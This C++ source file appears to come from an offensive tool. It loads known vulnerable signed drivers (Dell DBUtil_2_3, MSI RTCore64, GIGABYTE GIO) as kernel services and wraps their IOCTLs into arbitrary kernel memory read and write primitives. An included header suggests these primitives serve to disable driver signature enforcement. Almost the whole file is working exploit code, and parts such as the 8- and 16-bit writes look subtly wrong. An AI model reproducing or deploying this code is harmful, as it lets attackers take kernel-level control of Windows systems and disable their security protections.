#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <aclapi.h>
#include "DriverOps.h"
#include "DisableDSE.h"


HANDLE Device;
DRIVER_OPTION device_option;



DEFINE_DRIVER GetDefineDriver(DRIVER_OPTION device_option) {

    DEFINE_DRIVER defineDriver;

    switch (device_option) {
        case DBUtil_2_3:
            defineDriver.serviceName = L"DBUtil_2_3";
            defineDriver.displayName = L"Dell Dbutil Service";
            defineDriver.driverPath = L"\\\\.\\DBUtil_2_3";
            break;
        case RTCore64:
            defineDriver.serviceName = L"RTCore64";
            defineDriver.displayName = L"Micro - Star MSI Afterburner";
            defineDriver.driverPath = L"\\\\.\\RTCore64";
            break;
        case GIO:
            defineDriver.serviceName = L"GIO";
            defineDriver.displayName = L"GIGABYTE Service";
            defineDriver.driverPath = L"\\\\.\\GIO";
            break;
    }

    return defineDriver;

}


bool ServiceInstall(DRIVER_OPTION device_option, PCWSTR binPath, PCWSTR serviceName) {
    BOOL status = FALSE;
    SC_HANDLE hSC = NULL, hS = NULL;
    PCWSTR displayName = L"";


    if (serviceName == NULL && device_option == undefined) {
        printf("device option or service name was not provided");
        return false;
    }
    if (serviceName == NULL && device_option != undefined) {
        serviceName = GetDefineDriver(device_option).serviceName;
        displayName = GetDefineDriver(device_option).displayName;
    }



    if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE)) {
        if (hS = OpenService(hSC, serviceName, SERVICE_START)) {
            wprintf(L"\'%s\' service already registered\n", serviceName);
        }
        else {
            if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
                wprintf(L"\'%s\' service not present\n", serviceName);
                if (hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL)) {
                    wprintf(L"\'%s\' service successfully registered\n", serviceName);
                }
                else {
                    printf("CreateService failed with the error code 0x%08x\n", GetLastError());
                    return false;
                }
            }
            else {
                printf("OpenService failed with the error code 0x%08x\n", GetLastError());
                return false;
            }
        }
        if (hS) {
            if (status = StartService(hS, 0, NULL))
                wprintf(L"\'%s\' service started\n", serviceName);
            else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
                wprintf(L"\'%s\' service already started\n", serviceName);
            else {
                printf("StartService failed with the error code 0x%08x\n", GetLastError());
                return false;
            }
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    else {
        printf("OpenSCManager failed with the error code 0x%08x\n", GetLastError());
        return false;
    }
    return true;
}

bool ServiceUninstall(DRIVER_OPTION device_option, PCWSTR serviceName) {

    BOOL status = false;
    SC_HANDLE hSC, hS;
    SERVICE_STATUS serviceStatus;

    if (serviceName == NULL && device_option == undefined) {
        printf("device option or service name was not provided");
        return false;
    }
    if (serviceName == NULL && device_option != undefined) {
        serviceName = GetDefineDriver(device_option).serviceName;
    }


    if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
        if (hS = OpenService(hSC, serviceName, SERVICE_STOP)) {
            status = ControlService(hS, SERVICE_CONTROL_STOP, &serviceStatus);
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    if (status) {
        wprintf(L"\'%s\' service stopped\n", serviceName);
    }
    else if (GetLastError() == ERROR_SERVICE_NOT_ACTIVE) {
        wprintf(L"\'%s\' service not running\n", serviceName);
    }
    else {
        printf("OpenSCManager failed with the error code 0x%08x\n", GetLastError());
        return false;
    }

    if (SC_HANDLE hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
        if (SC_HANDLE hS = OpenService(hSC, serviceName, DELETE)) {
            BOOL status = DeleteService(hS);
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    return true;
}

bool InitDriver(DRIVER_OPTION dev_opt) {

    device_option = dev_opt;
    PCWSTR driverPath = GetDefineDriver(device_option).driverPath;

    Device = CreateFileW(driverPath, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);

    if (Device == INVALID_HANDLE_VALUE) {
        return false;
    }

    return true;
}

void CloseDriverHandle() {
    CloseHandle(Device);
}

DWORD ReadPrimitive_DBUtil_2_3(DWORD64 Address) {
    DBUTIL_READ_BUFFER ReadBuff{};
    ReadBuff.Address = Address;
    DWORD BytesRead;
    if (!DeviceIoControl(Device, DBUTIL_READ_IOCTL, &ReadBuff, sizeof(ReadBuff), &ReadBuff, sizeof(ReadBuff), &BytesRead, nullptr)) {
        printf("DeviceIoControl DBUTIL_READ_IOCTL failed with the error code 0x%08x\n", GetLastError());
        exit(1);
    }
    return ReadBuff.value;
}

void WritePrimitive_DBUtil_2_3(DWORD64 Address, DWORD Value) {
    DBUTIL_WRITE_BUFFER WriteBuff{};
    WriteBuff.Address = Address;
    WriteBuff.Value = Value;
    DWORD BytesWritten = 0;
    if (!DeviceIoControl(Device, DBUTIL_WRITE_IOCTL, &WriteBuff, sizeof(WriteBuff), &WriteBuff, sizeof(WriteBuff), &BytesWritten, nullptr)) {
        printf("DeviceIoControl DBUTIL_WRITE_IOCTL failed with the error code 0x%08x\n", GetLastError());
        exit(1);
    }
}

DWORD ReadPrimitive_RTCore64(DWORD64 Address) {
    RTC_MEMORY_READ mr;
    DWORD value;
    ZeroMemory(&mr, sizeof(mr));
    mr.Address = Address;
    mr.Size = sizeof(value);

    if (!DeviceIoControl(Device, RTC_IOCTL_MEMORY_READ, &mr, sizeof(mr), &mr, sizeof(mr), NULL, NULL)) {
        printf("DeviceIoControl RTC_IOCTL_MEMORY_READ failed with the error code 0x%08x\n", GetLastError());
        exit(1);
    }
    return mr.Value;
}

void WritePrimitive_RTCore64(DWORD64 Address, DWORD Value) {
    RTC_MEMORY_WRITE mw;

    ZeroMemory(&mw, sizeof(mw));
    mw.Address = Address;
    mw.Size = sizeof(Value);
    mw.Value = Value;

    if (!DeviceIoControl(Device, RTC_IOCTL_MEMORY_WRITE, &mw, sizeof(mw), &mw, sizeof(mw), NULL, NULL)) {
        printf("DeviceIoControl RTC_IOCTL_MEMORY_WRITE failed with the error code 0x%08x", GetLastError());
        exit(1);
    }
}


DWORD MemcpyReadPrimitive_GIO(DWORD64 Address) {
    GIOMemcpyInput MemcpyInput;
    ULONG OldValue = 0;
    MemcpyInput.Dst = reinterpret_cast<ULONG_PTR>(&OldValue);
    MemcpyInput.Src = Address;
    MemcpyInput.Size = GetBuildNumber() >= 9200 ? sizeof(ULONG) : sizeof(UCHAR);

    if (!DeviceIoControl(Device, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof(MemcpyInput), &MemcpyInput, sizeof(MemcpyInput), NULL, NULL)) {
        printf("DeviceIoControl IOCTL_GIO_MEMCPY failed with the error code 0x%08x", GetLastError());
        exit(1);
    }


    return OldValue;
}

void MemcpyWritePrimitive_GIO(DWORD64 Address, ULONG Value) {
    GIOMemcpyInput MemcpyInput;
    const UCHAR Value2 = static_cast<UCHAR>(Value);

    MemcpyInput.Dst = Address;
    MemcpyInput.Src = reinterpret_cast<ULONG_PTR>(&Value2);
    MemcpyInput.Size = GetBuildNumber() >= 9200 ? sizeof(ULONG) : sizeof(UCHAR);


    if (!DeviceIoControl(Device, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof(MemcpyInput), &MemcpyInput, sizeof(MemcpyInput), NULL, NULL)) {
        printf("DeviceIoControl IOCTL_GIO_MEMCPY failed with the error code 0x%08x", GetLastError());
        exit(1);
    }
}



DWORD ReadPrimitive(DWORD64 Address) {

    switch (device_option) {
        case DBUtil_2_3:
            return ReadPrimitive_DBUtil_2_3(Address);
        case RTCore64:
            return ReadPrimitive_RTCore64(Address);
        case GIO:
            return MemcpyReadPrimitive_GIO(Address);
    }
}

void WritePrimitive(DWORD64 Address, DWORD Value) {
    
    switch (device_option) {
        case DBUtil_2_3:
            WritePrimitive_DBUtil_2_3(Address, Value);
            return;
        case RTCore64:
            WritePrimitive_RTCore64(Address, Value);
            return;
        case GIO:
            MemcpyWritePrimitive_GIO(Address, Value);
            return;
    }

}

BOOL Read8(ULONG_PTR Address, PBYTE Value)
{
    DWORD dwValue;

    if (!Read32(Address, &dwValue))
        return false;

    *Value = dwValue & 0xff;

    return true;
}

BOOL Read16(ULONG_PTR Address, PWORD Value)
{
    DWORD dwValue;

    if (!Read32(Address, &dwValue))
        return false;

    *Value = dwValue & 0xffff;

    return true;
}

BOOL Read32(ULONG_PTR Address, PDWORD Value)
{
    DWORD temp = ReadPrimitive(Address);

    *Value = temp;

    return true;
}

BOOL Read64(ULONG_PTR Address, PDWORD64 Value)
{
    DWORD dwLow, dwHigh;

    if (!Read32(Address, &dwLow) || !Read32(Address + 4, &dwHigh))
        return false;

    *Value = dwHigh;
    *Value = (*Value << 32) | dwLow;

    return true;
}

BOOL ReadPtr(ULONG_PTR Address, PULONG_PTR Value)
{
#ifdef _WIN64
    return Read64(Address, Value);
#else
    return Read32(Address, Value);
#endif
}


BOOL Write8(ULONG_PTR Address, BYTE Value)
{
    WritePrimitive(Address, Value);
    return true;
}

BOOL Write16(ULONG_PTR Address, WORD Value)
{
    WritePrimitive(Address, Value);
    return true;
}

BOOL Write32(ULONG_PTR Address, DWORD Value)
{
    WritePrimitive(Address, Value);
    return true;
}

BOOL Write64(ULONG_PTR Address, DWORD64 Value)
{
    DWORD dwLow, dwHigh;

    dwLow = Value & 0xffffffff;
    dwHigh = (Value >> 32) & 0xffffffff;

    return Write32(Address, dwLow) && Write32(Address + 4, dwHigh);
}